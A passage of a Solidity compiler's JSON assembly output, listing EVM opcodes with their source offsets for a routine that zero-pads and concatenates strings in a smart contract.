											"value": "0"
										},
										{
											"begin": 10577,
											"end": 10580,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10564,
											"end": 10589,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10547,
											"end": 10589,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10547,
											"end": 10589,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10617,
											"end": 10618,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 10604,
											"end": 10613,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10604,
											"end": 10618,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 10600,
											"end": 11115,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 10600,
											"end": 11115,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "116"
										},
										{
											"begin": 10600,
											"end": 11115,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10635,
											"end": 10655,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "117"
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "PUSH",
											"source": 0,
											"value": "3000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10678,
											"end": 10681,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 10658,
											"end": 10665,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "tag",
											"source": 0,
											"value": "117"
										},
										{
											"begin": 10658,
											"end": 10683,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10635,
											"end": 10683,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10635,
											"end": 10683,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10705,
											"end": 10711,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10698,
											"end": 10711,
											"name": "SWAP6",
											"source": 0
										},
										{
											"begin": 10698,
											"end": 10711,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10698,
											"end": 10711,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10698,
											"end": 10711,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10698,
											"end": 10711,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10698,
											"end": 10711,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10698,
											"end": 10711,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10698,
											"end": 10711,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "102"
										},
										{
											"begin": 10698,
											"end": 10711,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10600,
											"end": 11115,
											"name": "tag",
											"source": 0,
											"value": "116"
										},
										{
											"begin": 10600,
											"end": 11115,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10746,
											"end": 10747,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 10733,
											"end": 10742,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10733,
											"end": 10747,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 10729,
											"end": 11115,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 10729,
											"end": 11115,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "119"
										},
										{
											"begin": 10729,
											"end": 11115,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10764,
											"end": 10784,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "120"
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "PUSH",
											"source": 0,
											"value": "3000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10807,
											"end": 10810,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 10787,
											"end": 10794,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "tag",
											"source": 0,
											"value": "120"
										},
										{
											"begin": 10787,
											"end": 10812,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10764,
											"end": 10812,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10764,
											"end": 10812,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10834,
											"end": 10840,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10827,
											"end": 10840,
											"name": "SWAP6",
											"source": 0
										},
										{
											"begin": 10827,
											"end": 10840,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10827,
											"end": 10840,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10827,
											"end": 10840,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10827,
											"end": 10840,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10827,
											"end": 10840,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10827,
											"end": 10840,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10827,
											"end": 10840,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "102"
										},
										{
											"begin": 10827,
											"end": 10840,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10729,
											"end": 11115,
											"name": "tag",
											"source": 0,
											"value": "119"
										},
										{
											"begin": 10729,
											"end": 11115,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10875,
											"end": 10876,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 10862,
											"end": 10871,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10862,
											"end": 10876,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 10858,
											"end": 11115,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 10858,
											"end": 11115,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "122"
										},
										{
											"begin": 10858,
											"end": 11115,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10893,
											"end": 10913,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "123"
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "PUSH",
											"source": 0,
											"value": "3030300000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10938,
											"end": 10941,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 10916,
											"end": 10923,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "tag",
											"source": 0,
											"value": "123"
										},
										{
											"begin": 10916,
											"end": 10943,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10893,
											"end": 10943,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10893,
											"end": 10943,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10965,
											"end": 10971,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10958,
											"end": 10971,
											"name": "SWAP6",
											"source": 0
										},
										{
											"begin": 10958,
											"end": 10971,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10958,
											"end": 10971,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10958,
											"end": 10971,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10958,
											"end": 10971,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10958,
											"end": 10971,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10958,
											"end": 10971,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10958,
											"end": 10971,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "102"
										},
										{
											"begin": 10958,
											"end": 10971,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10858,
											"end": 11115,
											"name": "tag",
											"source": 0,
											"value": "122"
										},
										{
											"begin": 10858,
											"end": 11115,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 11006,
											"end": 11007,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 10993,
											"end": 11002,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10993,
											"end": 11007,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 10989,
											"end": 11115,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 10989,
											"end": 11115,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "125"
										},
										{
											"begin": 10989,
											"end": 11115,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 11024,
											"end": 11044,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "126"
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "PUSH",
											"source": 0,
											"value": "3030303000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11070,
											"end": 11073,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 11047,
											"end": 11054,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "tag",
											"source": 0,
											"value": "126"
										},
										{
											"begin": 11047,
											"end": 11075,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 11024,
											"end": 11075,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 11024,
											"end": 11075,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11097,
											"end": 11103,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 11090,
											"end": 11103,
											"name": "SWAP6",
											"source": 0
										},
										{
											"begin": 11090,
											"end": 11103,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11090,
											"end": 11103,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11090,
											"end": 11103,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11090,
											"end": 11103,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11090,
											"end": 11103,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11090,
											"end": 11103,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11090,
											"end": 11103,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "102"
										},
										{
											"begin": 11090,
											"end": 11103,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10989,
											"end": 11115,
											"name": "tag",
											"source": 0,
											"value": "125"
										},
										{
											"begin": 10989,
											"end": 11115,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 11142,
											"end": 11145,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 11128,
											"end": 11146,
											"name": "SWAP5",
											"source": 0
										},
										{
											"begin": 11128,
											"end": 11146,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11128,
											"end": 11146,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11128,
											"end": 11146,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11128,
											"end": 11146,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11128,
											"end": 11146,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10139,
											"end": 11154,
											"name": "tag",
											"source": 0,
											"value": "102"
										},
										{
											"begin": 10139,
											"end": 11154,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10139,
											"end": 11154,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 10139,
											"end": 11154,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10139,
											"end": 11154,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10139,
											"end": 11154,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 17672,
											"end": 18307,
											"name": "tag",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 17672,
											"end": 18307,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 17755,
											"end": 17768,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 17781,
											"end": 17804,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 17813,
											"end": 17818,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 17781,
											"end": 17819,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 17781,
											"end": 17819,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17830,
											"end": 17854,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 17863,
											"end": 17869,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 17830,
											"end": 17870,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 17830,
											"end": 17870,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17884,
											"end": 17907,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 17941,
											"end": 17952,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 17941,
											"end": 17959,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 17921,
											"end": 17931,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 17921,
											"end": 17938,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 17921,
											"end": 17959,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "128"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "128"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "129"
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 21,
											"end": 27,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 17,
											"end": 31,
											"name": "MUL",
											"source": -1
										},
										{
											"begin": 124,
											"end": 128,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 108,
											"end": 122,
											"name": "CALLDATASIZE",
											"source": -1
										},
										{
											"begin": 100,
											"end": 106,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 87,
											"end": 129,
											"name": "CALLDATACOPY",
											"source": -1
										},
										{
											"begin": 155,
											"end": 159,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 147,
											"end": 153,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 143,
											"end": 160,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 133,
											"end": 160,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 133,
											"end": 160,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 0,
											"end": 164,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "tag",
											"source": 0,
											"value": "129"
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 17910,
											"end": 17960,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17884,
											"end": 17960,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 17884,
											"end": 17960,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 17971,
											"end": 17993,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 18002,
											"end": 18011,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 17971,
											"end": 18012,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 17971,
											"end": 18012,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18026,
											"end": 18032,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 18043,
											"end": 18049,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 18069,
											"end": 18070,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 18067,
											"end": 18070,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 18067,
											"end": 18070,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18063,
											"end": 18155,
											"name": "tag",
											"source": 0,
											"value": "130"
										},
										{
											"begin": 18063,
											"end": 18155,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 18074,
											"end": 18084,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 18074,
											"end": 18091,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 18072,
											"end": 18073,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 18072,
											"end": 18091,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 18063,
											"end": 18155,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 18063,
											"end": 18155,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "131"
										},
										{
											"begin": 18063,
											"end": 18155,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18140,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 18141,
											"end": 18142,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "133"
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "tag",
											"source": 0,
											"value": "133"
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 18130,
											"end": 18143,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18122,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 18123,
											"end": 18126,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 18123,
											"end": 18126,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 18123,
											"end": 18126,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 18123,
											"end": 18126,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 18123,
											"end": 18126,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 18123,
											"end": 18126,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18127,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18127,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18127,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18127,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18127,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "134"
										},
										{
											"begin": 18113,
											"end": 18127,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18127,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18127,
											"name": "tag",
											"source": 0,
											"value": "134"
										},
										{
											"begin": 18113,
											"end": 18127,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18127,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 18113,
											"end": 18127,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18127,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18143,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 18113,
											"end": 18143,
											"name": "PUSH",
											"source": 0,
